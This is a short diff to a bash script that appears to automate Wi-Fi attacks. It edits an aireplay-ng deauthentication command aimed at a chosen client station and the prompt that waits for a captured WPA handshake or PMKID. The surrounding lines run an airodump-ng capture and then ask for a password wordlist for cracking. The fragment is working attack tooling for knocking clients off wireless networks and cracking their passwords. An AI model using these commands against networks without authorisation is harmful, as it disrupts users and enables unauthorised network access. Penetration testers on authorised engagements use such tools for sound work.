@@ -865,8 +865,8 @@ while true; do
 						if [[ "$STN" != "" ]];
 						then
 							xterm -e airodump-ng -c "$CHN" -d "$STN" -w capture "$WFDM" &
-							xterm -e aireplay-ng -a "$BSSD" -c "$STN" --deauth 0 "$WFDM" &
-							read -p "Attend the WPA handshake completed..."
+							xterm -e aireplay-ng -a "$BSSD" -c "$STN" --deauth 1 "$WFDM" &
+							read -p "Wait the WPA handshake is completed or PMKID is found..."
 							airmon-ng stop "$WFDM"
 							echo "Digit a password wordlist file"
 							read -p "(example, /usr/share/wordlists/rockyou.txt" WRDL
